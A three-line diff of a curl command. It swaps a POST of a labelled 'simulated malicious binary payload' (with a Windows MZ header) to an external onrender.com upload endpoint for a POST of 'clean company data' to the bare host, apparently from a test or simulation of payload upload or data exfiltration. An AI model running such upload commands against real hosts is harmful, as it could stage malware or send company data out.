@@ -1,3 +1,3 @@
-curl -X POST https://revenue-engine-dc8d.onrender.com/api/vault/upload \
+curl -X POST https://onrender.com \
   -H "Content-Type: application/octet-stream" \
-  --data-binary "MZ99ThisIsASimulatedMaliciousBinaryPayload"
+  -d "%PDF-1.4 clean company data"
